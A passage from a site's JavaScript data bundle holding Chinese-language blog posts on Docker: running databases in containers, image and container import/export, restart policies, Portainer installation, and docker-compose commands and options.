mysql，数据库程序与数据需要进行分离，将数据存放到共享存储，程序放到容器里。如果容器有异常或 mysql 服务异常，自动启动一个全新的容器。另外，建议不要把数据存放到宿主机里，宿主机和容器共享卷组，对宿主机损坏的影响比较大。\n> \n> (2)跑轻量级或分布式数据库\n> \n> docker 里部署轻量级或分布式数据库，docker 本身就推荐服务挂掉，自动启动新容器，而不是继续重启容器服务。\n> \n> (3)合理布局应用\n> \n> 对于io要求比较高的应用或者服务，将数据库部署在物理机或者kvm中比较合适。目前tx云的tdsql和阿里的oceanbase都是直接部署在物理机器，而非docker 。\n\n3、网络问题要理解 docker 网络，您必须对网络虚拟化有深入的了解。数据库需要专用的和持久的吞吐量，以实现更高的负载。未解决的 docker 网络问题在1.9版本依然没有得到解决。把这些问题放在一起，容器化使数据库容器很难管理。你需要花多少时间解决 docker 网络问题？将数据库放在专用环境不会更好吗？节省时间来专注于真正重要的业务目标。\n\n4、状态在 docker 中打包无状态服务是很酷的，可以实现编排容器并解决单点故障问题。但是数据库呢？将数据库放在同一个环境中，它将会是有状态的，并使系统故障的范围更大。下次您的应用程序实例或应用程序崩溃，可能会影响数据库。知识点:在 docker 中水平伸缩只能用于无状态计算服务，而不是数据库。docker 快速扩展的一个重要特征就是无状态，具有数据状态的都不适合直接放在 docker 里面，如果 docker 中安装数据库，存储服务需要单独提供。目前，tx云的tdsql(金融分布式数据库)和阿里云的oceanbase(分布式数据库系统)都直接运行中在物理机器上，并非使用便于管理的 docker 上。\n\n5、资源隔离资源隔离方面，docker 确实不如虚拟机kvm，docker是利用cgroup实现资源限制的，只能限制资源消耗的最大值，而不能隔绝其他程序占用自己的资源。如果其他应用过渡占用物理机资源，将会影响容器里 mysql 的读写效率。需要的隔离级别越多，获得的资源开销就越多。相比专用环境而言，容易水平伸缩是docker的一大优势。然而在 docker 中水平伸缩只能用于无状态计算服务，数据库并不适用。我们没有看到任何针对数据库的隔离功能，那为什么我们应该把它放在容器中呢？\n\n6、云平台的不适用性大部分人通过共有云开始项目。云简化了虚拟机操作和替换的复杂性，因此不需要在夜间或周末没有人工作时间来测试新的硬件环境。当我们可以迅速启动一个实例的时候，为什么我们需要担心这个实例运行的环境？这就是为什么我们向云提供商支付很多费用的原因。当我们为实例放置数据库容器时，上面说的这些便利性就不存在了。因为数据不一致，新实例不会与老实例兼容，如果要限制实例使用单机服务，应该让 db 使用非容器化环境，我们仅仅需要为计算服务层保留弹性扩展的能力。\n\n7、运行数据库的环境需求常看到 dbms 容器和其他服务运行在同一主机上。然而这些服务对硬件要求是非常不同的。数据库（特别是关系型数据库）对 io 的要求较高。一般数据库引擎为了避免并发资源竞争而使用专用环境。如果将你的数据库放在容器中，那么将浪费你的项目的资源。因为你需要为该实例配置大量额外的资源。在公有云，当你需要 34g 内存时，你启动的实例却必须开 64g 内存。在实践中，这些资源并未完全使用。怎么解决？您可以分层设计，并使用固定资源来启动不同层次的多个实例。水平伸缩总是比垂直伸缩更好。\n\n\n# 总结\n\n针对上面问题是不是说数据库一定不要部署在容器里吗？\n\n答案是：并不是我们可以把数据丢失不敏感的业务（搜索、埋点）就可以容器化，利用数据库分片来来增加实例数，从而增加吞吐量。docker适合跑轻量级或分布式数据库，当docker服务挂掉，会自动启动新容器，而不是继续重启容器服务。数据库利用中间件和容器化系统能够自动伸缩、容灾、切换、自带多个节点，也是可以进行容器化的。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"docker镜像和容器的导入导出",frontmatter:{title:"docker镜像和容器的导入导出",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/801726/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/02.docker%E9%95%9C%E5%83%8F%E5%92%8C%E5%AE%B9%E5%99%A8%E7%9A%84%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA.html",relativePath:"08.软件使用/01.docker/02.docker镜像和容器的导入导出.md",key:"v-50a3f22e",path:"/pages/801726/",headers:[{level:2,title:"导入 load 命令",slug:"导入-load-命令",normalizedTitle:"导入 load 命令",charIndex:9},{level:2,title:"导出 save 命令",slug:"导出-save-命令",normalizedTitle:"导出 save 命令",charIndex:102},{level:2,title:"导入 import 命令",slug:"导入-import-命令",normalizedTitle:"导入 import 命令",charIndex:257},{level:2,title:"导出 export 命令",slug:"导出-export-命令",normalizedTitle:"导出 export 命令",charIndex:417}],headersStr:"导入 load 命令 导出 save 命令 导入 import 命令 导出 export 命令",content:"# 镜像\n\n\n# 导入 load 命令\n\ndocker load [options]\n\n\n1\n\n\neg:docker load -i nginx.tar\n\n * nginx.tar 导入的文件名\n\n\n# 导出 save 命令\n\ndocker save [options] images [images...]\n\n\n1\n\n\neg :docker save -o nginx.tar nginx:latest\n\n * nginx.tar:保存的目标文件名\n * nginx:latest是镜像名\n\n\n# 容器\n\n\n# 导入 import 命令\n\ndocker import [options] file|URL|- [REPOSITORY[:TAG]]\n\n\n1\n\n\neg:docker import nginx-test.tar nginx:imp\n\n * nginx-test.tar:文件名\n * nginx:imp:容器名\n\n\n# 导出 export 命令\n\ndocker export [options] container\n\n\n1\n\n\neg:docker export -o nginx-test.tar nginx-test\n\n * nginx-test.tar:目标文件\n * nginx-test:源容器名\n\n\n# 区别\n\nexport导出的文件再import回去时，无法保留镜像所有历史，不能进行回滚操作 而save是依据镜像来的，所以导入时可以完整保留下每一层layer信息",normalizedContent:"# 镜像\n\n\n# 导入 load 命令\n\ndocker load [options]\n\n\n1\n\n\neg:docker load -i nginx.tar\n\n * nginx.tar 导入的文件名\n\n\n# 导出 save 命令\n\ndocker save [options] images [images...]\n\n\n1\n\n\neg :docker save -o nginx.tar nginx:latest\n\n * nginx.tar:保存的目标文件名\n * nginx:latest是镜像名\n\n\n# 容器\n\n\n# 导入 import 命令\n\ndocker import [options] file|url|- [repository[:tag]]\n\n\n1\n\n\neg:docker import nginx-test.tar nginx:imp\n\n * nginx-test.tar:文件名\n * nginx:imp:容器名\n\n\n# 导出 export 命令\n\ndocker export [options] container\n\n\n1\n\n\neg:docker export -o nginx-test.tar nginx-test\n\n * nginx-test.tar:目标文件\n * nginx-test:源容器名\n\n\n# 区别\n\nexport导出的文件再import回去时，无法保留镜像所有历史，不能进行回滚操作 而save是依据镜像来的，所以导入时可以完整保留下每一层layer信息",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Docker容器的重启策略及docker run的--restart选项详解",frontmatter:{title:"Docker容器的重启策略及docker run的--restart选项详解",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d946e8/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/03.Docker%E5%AE%B9%E5%99%A8%E7%9A%84%E9%87%8D%E5%90%AF%E7%AD%96%E7%95%A5%E5%8F%8Adocker%20run%E7%9A%84--restart%E9%80%89%E9%A1%B9%E8%AF%A6%E8%A7%A3.html",relativePath:"08.软件使用/01.docker/03.Docker容器的重启策略及docker run的--restart选项详解.md",key:"v-66f4008e",path:"/pages/d946e8/",headersStr:null,content:'# 1. Docker容器的重启策略\n\nDocker容器的重启策略是面向生产环境的一个启动策略，在开发过程中可以忽略该策略。\n\nDocker容器的重启都是由Docker守护进程完成的，因此与守护进程息息相关。\n\nDocker容器的重启策略如下：\n\n * no，默认策略，在容器退出时不重启容器\n * on-failure，在容器非正常退出时（退出状态非0），才会重启容器\n * on-failure:3，在容器非正常退出时重启容器，最多重启3次\n * always，在容器退出时总是重启容器\n * unless-stopped，在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器\n\n\n# 2. Docker容器的退出状态码\n\ndocker run的退出状态码如下：\n\n * 0，表示正常退出\n * 非0，表示异常退出（退出状态码采用chroot标准）\n * 125，Docker守护进程本身的错误\n * 126，容器启动后，要执行的默认命令无法调用\n * 127，容器启动后，要执行的默认命令不存在\n * 其他命令状态码，容器启动后正常执行命令，退出命令时该命令的返回状态码作为容器的退出状态码\n\n\n# 3. docker run的--restart选项\n\n通过--restart选项，可以设置容器的重启策略，以决定在容器退出时Docker守护进程是否重启刚刚退出的容器。\n\n--restart选项通常只用于detached模式的容器。\n\n--restart选项不能与--rm选项同时使用。显然，--restart选项适用于detached模式的容器，而--rm选项适用于foreground模式的容器。\n\n在docker ps查看容器时，对于使用了--restart选项的容器，其可能的状态只有Up或Restarting两种状态。\n\n示例： docker run -d --restart=always ba-208 docker run -d --restart=on-failure:10 ba-208\n\n补充：\n\n查看容器重启次数 docker inspect -f "{undefined{ .RestartCount }}" ba-208 查看容器最后一次的启动时间 docker inspect -f "{undefined{ .State.StartedAt }}" ba-208\n\n参考链接：\n\nhttps://docs.docker.com/engine/reference/run/',normalizedContent:'# 1. docker容器的重启策略\n\ndocker容器的重启策略是面向生产环境的一个启动策略，在开发过程中可以忽略该策略。\n\ndocker容器的重启都是由docker守护进程完成的，因此与守护进程息息相关。\n\ndocker容器的重启策略如下：\n\n * no，默认策略，在容器退出时不重启容器\n * on-failure，在容器非正常退出时（退出状态非0），才会重启容器\n * on-failure:3，在容器非正常退出时重启容器，最多重启3次\n * always，在容器退出时总是重启容器\n * unless-stopped，在容器退出时总是重启容器，但是不考虑在docker守护进程启动时就已经停止了的容器\n\n\n# 2. docker容器的退出状态码\n\ndocker run的退出状态码如下：\n\n * 0，表示正常退出\n * 非0，表示异常退出（退出状态码采用chroot标准）\n * 125，docker守护进程本身的错误\n * 126，容器启动后，要执行的默认命令无法调用\n * 127，容器启动后，要执行的默认命令不存在\n * 其他命令状态码，容器启动后正常执行命令，退出命令时该命令的返回状态码作为容器的退出状态码\n\n\n# 3. docker run的--restart选项\n\n通过--restart选项，可以设置容器的重启策略，以决定在容器退出时docker守护进程是否重启刚刚退出的容器。\n\n--restart选项通常只用于detached模式的容器。\n\n--restart选项不能与--rm选项同时使用。显然，--restart选项适用于detached模式的容器，而--rm选项适用于foreground模式的容器。\n\n在docker ps查看容器时，对于使用了--restart选项的容器，其可能的状态只有up或restarting两种状态。\n\n示例： docker run -d --restart=always ba-208 docker run -d --restart=on-failure:10 ba-208\n\n补充：\n\n查看容器重启次数 docker inspect -f "{undefined{ .restartcount }}" ba-208 查看容器最后一次的启动时间 docker inspect -f "{undefined{ .state.startedat }}" ba-208\n\n参考链接：\n\nhttps://docs.docker.com/engine/reference/run/',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Linux设置docker服务开机自启动以及容器自启动",frontmatter:{title:"Linux设置docker服务开机自启动以及容器自启动",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/08bb44/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/04.Linux%E8%AE%BE%E7%BD%AEdocker%E6%9C%8D%E5%8A%A1%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8A%E5%AE%B9%E5%99%A8%E8%87%AA%E5%90%AF%E5%8A%A8.html",relativePath:"08.软件使用/01.docker/04.Linux设置docker服务开机自启动以及容器自启动.md",key:"v-15f9b79e",path:"/pages/08bb44/",headersStr:null,content:"linux开机自启动\n\ndocker服务开机自启动\n\n设置容器自启动\n\n可以在运行的时候通过设置--restart 参数\n\ndocker run --restart always --name mynginx -d nginx\n\n\n1\n\n\n参数取值\n\n参数               说明\nno               不自动重启容器. (默认值)\non-failure       容器发生error而退出(容器退出状态不为0)重启容器,可以指定重启的最大次数，如：on-failure:10\nunless-stopped   在容器已经stop掉或Docker stoped/restarted的时候才重启容器\nalways           在容器已经stop掉或Docker stoped/restarted的时候才重启容器，手动stop的不算\n\n如果容器已经创建，可以通过以下方式更新重启策略\n\ndocker update --restart always 容器ID\n\n\n1\n",normalizedContent:"linux开机自启动\n\ndocker服务开机自启动\n\n设置容器自启动\n\n可以在运行的时候通过设置--restart 参数\n\ndocker run --restart always --name mynginx -d nginx\n\n\n1\n\n\n参数取值\n\n参数               说明\nno               不自动重启容器. (默认值)\non-failure       容器发生error而退出(容器退出状态不为0)重启容器,可以指定重启的最大次数，如：on-failure:10\nunless-stopped   在容器已经stop掉或docker stoped/restarted的时候才重启容器\nalways           在容器已经stop掉或docker stoped/restarted的时候才重启容器，手动stop的不算\n\n如果容器已经创建，可以通过以下方式更新重启策略\n\ndocker update --restart always 容器id\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"portainer的安装",frontmatter:{title:"portainer的安装",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/6a2cdf/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/05.portainer%E7%9A%84%E5%AE%89%E8%A3%85.html",relativePath:"08.软件使用/01.docker/05.portainer的安装.md",key:"v-64413722",path:"/pages/6a2cdf/",headersStr:null,content:"# 什么是portainer\n\n图形化 docker管理工具\n\n\n# 安装过程\n\n 1. 创建一个文件夹用于portainer的映射（其实也可以直接用数据卷）\n 2. 执行命令\n\ndocker run -d -p 9000:9000 --name portainer \\\n    --restart=always \\\n    -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v $PWD/data:/data \\\n    cr.portainer.io/portainer/portainer-ce:latest\n\n\n1\n2\n3\n4\n5\n",normalizedContent:"# 什么是portainer\n\n图形化 docker管理工具\n\n\n# 安装过程\n\n 1. 创建一个文件夹用于portainer的映射（其实也可以直接用数据卷）\n 2. 执行命令\n\ndocker run -d -p 9000:9000 --name portainer \\\n    --restart=always \\\n    -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v $pwd/data:/data \\\n    cr.portainer.io/portainer/portainer-ce:latest\n\n\n1\n2\n3\n4\n5\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"docker-compose up与docker-compose up -d",frontmatter:{title:"docker-compose up与docker-compose up -d",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/84ac8b/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/06.docker-compose%20up%E4%B8%8Edocker-compose%20up%20-d.html",relativePath:"08.软件使用/01.docker/06.docker-compose up与docker-compose up -d.md",key:"v-e25d8d1e",path:"/pages/84ac8b/",headersStr:null,content:"两者都是创建或者重新创建容器，附加给当前服务器，除此之外，除非服务已经运行，否则启动所有链接服务。 docker-compose up 本质是docker-compose logs -f，它会收集所有容器的日志输出直到退出命令，或者容器都停止运行。 docker-compose up -d 以后台的方式运行容器。不会在终端上打印运行日志",normalizedContent:"两者都是创建或者重新创建容器，附加给当前服务器，除此之外，除非服务已经运行，否则启动所有链接服务。 docker-compose up 本质是docker-compose logs -f，它会收集所有容器的日志输出直到退出命令，或者容器都停止运行。 docker-compose up -d 以后台的方式运行容器。不会在终端上打印运行日志",charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:56:19",lastUpdatedTimestamp:1653980179e3},{title:"Docker 入门之 docker-compose",frontmatter:{title:"Docker 入门之 docker-compose",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/a4f48e/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/07.Docker%20%E5%85%A5%E9%97%A8%E4%B9%8B%20docker-compose.html",relativePath:"08.软件使用/01.docker/07.Docker 入门之 docker-compose.md",key:"v-2d25b0bc",path:"/pages/a4f48e/",headers:[{level:2,title:"一. Docker-compose 简介",slug:"一-docker-compose-简介",normalizedTitle:"一. docker-compose 简介",charIndex:73},{level:3,title:"1. Docker-compose 简介",slug:"_1-docker-compose-简介",normalizedTitle:"1. docker-compose 简介",charIndex:98},{level:3,title:"2. Docker-compose 的安装",slug:"_2-docker-compose-的安装",normalizedTitle:"2. docker-compose 的安装",charIndex:875},{level:3,title:"3. Docker-compose 卸载",slug:"_3-docker-compose-卸载",normalizedTitle:"3. docker-compose 卸载",charIndex:1141},{level:2,title:"二. Docker-compose 常用命令",slug:"二-docker-compose-常用命令",normalizedTitle:"二. docker-compose 常用命令",charIndex:1197},{level:3,title:"1. Docker-compose 命令格式",slug:"_1-docker-compose-命令格式",normalizedTitle:"1. docker-compose 命令格式",charIndex:1224},{level:3,title:"2. docker-compose up",slug:"_2-docker-compose-up",normalizedTitle:"2. docker-compose up",charIndex:1531},{level:3,title:"3. docker-compose ps",slug:"_3-docker-compose-ps",normalizedTitle:"3. docker-compose ps",charIndex:1996},{level:3,title:"4. docker-compose stop",slug:"_4-docker-compose-stop",normalizedTitle:"4. docker-compose stop",charIndex:2085},{level:3,title:"5. docker-compose -h",slug:"_5-docker-compose-h",normalizedTitle:"5. docker-compose -h",charIndex:2273},{level:3,title:"6. docker-compose down",slug:"_6-docker-compose-down",normalizedTitle:"6. docker-compose down",charIndex:2329},{level:3,title:"7. docker-compose logs",slug:"_7-docker-compose-logs",normalizedTitle:"7. docker-compose logs",charIndex:2609},{level:3,title:"8. docker-compose bulid",slug:"_8-docker-compose-bulid",normalizedTitle:"8. docker-compose bulid",charIndex:2804},{level:3,title:"9. docker-compose pull",slug:"_9-docker-compose-pull",normalizedTitle:"9. docker-compose pull",charIndex:3172},{level:3,title:"10. docker-compose restart",slug:"_10-docker-compose-restart",normalizedTitle:"10. docker-compose restart",charIndex:3385},{level:3,title:"11. docker-compose rm",slug:"_11-docker-compose-rm",normalizedTitle:"11. docker-compose rm",charIndex:3569},{level:3,title:"12. docker-compose start",slug:"_12-docker-compose-start",normalizedTitle:"12. docker-compose start",charIndex:3788},{level:3,title:"13. docker-compose run",slug:"_13-docker-compose-run",normalizedTitle:"13. docker-compose run",charIndex:3895},{level:3,title:"14. docker-compose scale",slug:"_14-docker-compose-scale",normalizedTitle:"14. docker-compose scale",charIndex:3998},{level:3,title:"15. docker-compose pause",slug:"_15-docker-compose-pause",normalizedTitle:"15. docker-compose pause",charIndex:4103},{level:3,title:"16. docker-compose kill",slug:"_16-docker-compose-kill",normalizedTitle:"16. docker-compose kill",charIndex:4183},{level:3,title:"17. docker-compose config",slug:"_17-docker-compose-config",normalizedTitle:"17. docker-compose config",charIndex:4358},{level:3,title:"18. docker-compose create",slug:"_18-docker-compose-create",normalizedTitle:"18. docker-compose create",charIndex:4590},{level:3,title:"19. docker-compose exec",slug:"_19-docker-compose-exec",normalizedTitle:"19. docker-compose exec",charIndex:4843},{level:3,title:"20. docker-compose port",slug:"_20-docker-compose-port",normalizedTitle:"20. docker-compose port",charIndex:5149},{level:3,title:"21. docker-compose push",slug:"_21-docker-compose-push",normalizedTitle:"21. docker-compose push",charIndex:5347},{level:3,title:"22. docker-compose stop",slug:"_22-docker-compose-stop",normalizedTitle:"22. docker-compose stop",charIndex:5481},{level:3,title:"23. docker-compose uppause",slug:"_23-docker-compose-uppause",normalizedTitle:"23. docker-compose uppause",charIndex:5568},{level:2,title:"三. Docker-compose 模板文件",slug:"三-docker-compose-模板文件",normalizedTitle:"三. docker-compose 模板文件",charIndex:5657},{level:3,title:"1. Docker-compose 模板文件简介",slug:"_1-docker-compose-模板文件简介",normalizedTitle:"1. docker-compose 模板文件简介",charIndex:5684},{level:3,title:"2. image",slug:"_2-image",normalizedTitle:"2. image",charIndex:6741},{level:3,title:"3. build",slug:"_3-build",normalizedTitle:"3. build",charIndex:6865},{level:3,title:"4. context",slug:"_4-context",normalizedTitle:"4. context",charIndex:7335},{level:3,title:"5. dockerfile",slug:"_5-dockerfile",normalizedTitle:"5. dockerfile",charIndex:7492},{level:3,title:"6. commond",slug:"_6-commond",normalizedTitle:"6. commond",charIndex:7605},{level:3,title:"7. container_name",slug:"_7-container-name",normalizedTitle:"7. container_name",charIndex:7660},{level:3,title:"8. depends_on",slug:"_8-depends-on",normalizedTitle:"8. depends_on",charIndex:7786},{level:3,title:"9. PID",slug:"_9-pid",normalizedTitle:"9. pid",charIndex:8165},{level:3,title:"10. ports",slug:"_10-ports",normalizedTitle:"10. ports",charIndex:8264},{level:3,title:"11. extra_hosts",slug:"_11-extra-hosts",normalizedTitle:"11. extra_hosts",charIndex:8527},{level:3,title:"12. volumes",slug:"_12-volumes",normalizedTitle:"12. volumes",charIndex:8741},{level:3,title:"13. volumes_from",slug:"_13-volumes-from",normalizedTitle:"13. volumes_from",charIndex:9300},{level:3,title:"14. dns",slug:"_14-dns",normalizedTitle:"14. dns",charIndex:9407},{level:3,title:"15. expose",slug:"_15-expose",normalizedTitle:"15. expose",charIndex:9512},{level:3,title:"16.links",slug:"_16-links",normalizedTitle:"16.links",charIndex:9618},{level:3,title:"17.net",slug:"_17-net",normalizedTitle:"17.net",charIndex:9750},{level:2,title:"四. Docker-compose 模板文件示例",slug:"四-docker-compose-模板文件示例",normalizedTitle:"四. docker-compose 模板文件示例",charIndex:9818},{level:3,title:"1. Docker-compose 模板文件编写",slug:"_1-docker-compose-模板文件编写",normalizedTitle:"1. docker-compose 模板文件编写",charIndex:9847},{level:3,title:"2. 启动应用",slug:"_2-启动应用",normalizedTitle:"2. 启动应用",charIndex:10478},{level:3,title:"3. 服务访问",slug:"_3-服务访问",normalizedTitle:"3. 服务访问",charIndex:10596}],headersStr:"一. Docker-compose 简介 1. Docker-compose 简介 2. Docker-compose 的安装 3. Docker-compose 卸载 二. Docker-compose 常用命令 1. Docker-compose 命令格式 2. docker-compose up 3. docker-compose ps 4. docker-compose stop 5. docker-compose -h 6. docker-compose down 7. docker-compose logs 8. docker-compose bulid 9. docker-compose pull 10. docker-compose restart 11. docker-compose rm 12. docker-compose start 13. docker-compose run 14. docker-compose scale 15. docker-compose pause 16. docker-compose kill 17. docker-compose config 18. docker-compose create 19. docker-compose exec 20. docker-compose port 21. docker-compose push 22. docker-compose stop 23. docker-compose uppause 三. Docker-compose 模板文件 1. Docker-compose 模板文件简介 2. image 3. build 4. context 5. dockerfile 6. commond 7. container_name 8. depends_on 9. PID 10. ports 11. extra_hosts 12. volumes 13. volumes_from 14. dns 15. expose 16.links 17.net 四. Docker-compose 模板文件示例 1. Docker-compose 模板文件编写 2. 启动应用 3. 服务访问",content:'> 本文由原文地址 www.cnblogs.com\n\n参考：https://blog.51cto.com/9291927/2310444\n\n\n# 一. Docker-compose 简介\n\n\n# 1. Docker-compose 简介\n\nDocker-Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排。 Docker-Compose 将所管理的容器分为三层，分别是工程（project），服务（service）以及容器（container）。Docker-Compose 运行目录下的所有文件（docker-compose.yml，extends 文件或环境变量文件等）组成一个工程，若无特殊指定工程名即为当前目录名。一个工程当中可包含多个服务，每个服务中定义了容器运行的镜像，参数，依赖。一个服务当中可包括多个容器实例，Docker-Compose 并没有解决负载均衡的问题，因此需要借助其它工具实现服务发现及负载均衡。 Docker-Compose 的工程配置文件默认为 docker-compose.yml，可通过环境变量 COMPOSE_FILE 或 - f 参数自定义配置文件，其定义了多个有依赖关系的服务及每个服务运行的容器。 使用一个 Dockerfile 模板文件，可以让用户很方便的定义一个单独的应用容器。在工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 Web 项目，除了 Web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。 Compose 允许用户通过一个单独的 docker-compose.yml 模板文件（YAML 格式）来定义一组相关联的应用容器为一个项目（project）。 Docker-Compose 项目由 Python 编写，调用 Docker 服务提供的 API 来对容器进行管理。因此，只要所操作的平台支持 Docker API，就可以在其上利用 Compose 来进行编排管理。\n\n\n# 2. Docker-compose 的安装\n\n安装环境查看\n也可以使用其他发行版本 Linux 系统\n\n安装\napt-get install python-pip\napt-get -y install docker-compose\n红帽系 Linux 使用以下命令安装\nyum -y install python-pip\nyum -y install docker-compose\n查看安装的版本\ndocker-compose -v\ndocker-compose version 1.21.0, build unknown\n\n\n# 3. Docker-compose 卸载\n\napt-get remove docker-compose\n\n\n# 二. Docker-compose 常用命令\n\n\n# 1. Docker-compose 命令格式\n\ndocker-compose [-f <arg>...] [options] [COMMAND] [ARGS...]\n命令选项如下\n\n-f --file FILE指定Compose模板文件，默认为docker-compose.yml\n-p --project-name NAME 指定项目名称，默认使用当前所在目录为项目名\n--verbose  输出更多调试信息\n-v，-version 打印版本并退出\n--log-level LEVEL 定义日志等级(DEBUG, INFO, WARNING, ERROR, CRITICAL)\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2. docker-compose up\n\ndocker-compose up [options] [--scale SERVICE=NUM...] [SERVICE...]\n选项包括：\n-d 在后台运行服务容器\n-no-color 不是有颜色来区分不同的服务的控制输出\n-no-deps 不启动服务所链接的容器\n--force-recreate 强制重新创建容器，不能与-no-recreate同时使用\n–no-recreate 如果容器已经存在，则不重新创建，不能与–force-recreate同时使用\n–no-build 不自动构建缺失的服务镜像\n–build 在启动容器前构建服务镜像\n–abort-on-container-exit 停止所有容器，如果任何一个容器被停止，不能与-d同时使用\n-t, –timeout TIMEOUT 停止容器时候的超时（默认为10秒）\n–remove-orphans 删除服务中没有在compose文件中定义的容器\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 3. docker-compose ps\n\ndocker-compose  ps [options] [SERVICE...]\n列出项目中所有在运行的容器\n\n\n1\n2\n\n\n\n# 4. docker-compose stop\n\ndocker-compose stop [options] [SERVICE...]\n选项包括\n-t, –timeout TIMEOUT 停止容器时候的超时（默认为10秒）\ndocker-compose stop\n停止正在运行的容器，可以通过docker-compose start 再次启动\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. docker-compose -h\n\ndocker-compose -h\n查看帮助\n\n\n1\n2\n\n\n\n# 6. docker-compose down\n\ndocker-compose down [options]\n停止和删除容器、网络、卷、镜像。\n选项包括：\n–rmi type，删除镜像，类型必须是：all，删除compose文件中定义的所有镜像；local，删除镜像名为空的镜像\n-v, –volumes，删除已经在compose文件中定义的和匿名的附在容器上的数据卷\n–remove-orphans，删除服务中没有在compose中定义的容器\ndocker-compose down\n停用移除所有容器以及网络相关\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 7. docker-compose logs\n\ndocker-compose logs [options] [SERVICE...]\n查看服务容器的输出。默认情况下，docker-compose将对不同的服务输出使用不同的颜色来区分。可以通过–no-color来关闭颜色。\ndocker-compose logs\n查看服务容器的输出 \n-f 跟踪日志输出\n\n\n1\n2\n3\n4\n5\n\n\n\n# 8. docker-compose bulid\n\ndocker-compose build [options] [--build-arg key=val...] [SERVICE...]\n构建（重新构建）项目中的服务容器。\n选项包括：\n–compress 通过gzip压缩构建上下环境\n–force-rm 删除构建过程中的临时容器\n–no-cache 构建镜像过程中不使用缓存\n–pull 始终尝试通过拉取操作来获取更新版本的镜像\n-m, –memory MEM为构建的容器设置内存大小\n–build-arg key=val为服务设置build-time变量\n服务容器一旦构建后，将会带上一个标记名。可以随时在项目目录下运行docker-compose build来重新构建服务\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 9. docker-compose pull\n\ndocker-compose pull [options] [SERVICE...]\n拉取服务依赖的镜像。\n选项包括：\n–ignore-pull-failures，忽略拉取镜像过程中的错误\n–parallel，多个镜像同时拉取\n–quiet，拉取镜像过程中不打印进度信息\ndocker-compose pull\n拉取服务依赖的镜像\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 10. docker-compose restart\n\ndocker-compose restart [options] [SERVICE...]\n重启项目中的服务。\n选项包括：\n-t, –timeout TIMEOUT，指定重启前停止容器的超时（默认为10秒）\ndocker-compose restart\n重启项目中的服务 \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 11. docker-compose rm\n\ndocker-compose rm [options] [SERVICE...]\n删除所有（停止状态的）服务容器。\n选项包括：\n–f, –force，强制直接删除，包括非停止状态的容器\n-v，删除容器所挂载的数据卷\ndocker-compose rm\n删除所有（停止状态的）服务容器。推荐先执行docker-compose stop命令来停止容器。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 12. docker-compose start\n\ndocker-compose start [SERVICE...]\ndocker-compose start\n启动已经存在的服务容器。\n\n\n1\n2\n3\n\n\n\n# 13. docker-compose run\n\ndocker-compose scale web=3 db=2\n设置指定服务运行的容器个数。通过service=num的参数来设置数量\n\n\n1\n2\n\n\n\n# 14. docker-compose scale\n\ndocker-compose scale web=3 db=2\n设置指定服务运行的容器个数。通过service=num的参数来设置数量\n\n\n1\n2\n\n\n\n# 15. docker-compose pause\n\ndocker-compose pause [SERVICE...]\n暂停一个服务容器\n\n\n1\n2\n\n\n\n# 16. docker-compose kill\n\ndocker-compose kill [options] [SERVICE...]\n通过发送SIGKILL信号来强制停止服务容器。 \n支持通过-s参数来指定发送的信号，例如通过如下指令发送SIGINT信号：\ndocker-compose kill -s SIGINT\n\n\n1\n2\n3\n4\n\n\n\n# 17. docker-compose config\n\ndocker-compose config [options]\n验证并查看compose文件配置。\n选项包括：\n–resolve-image-digests 将镜像标签标记为摘要\n-q, –quiet 只验证配置，不输出。 当配置正确时，不输出任何内容，当文件配置错误，输出错误信息\n–services 打印服务名，一行一个\n–volumes 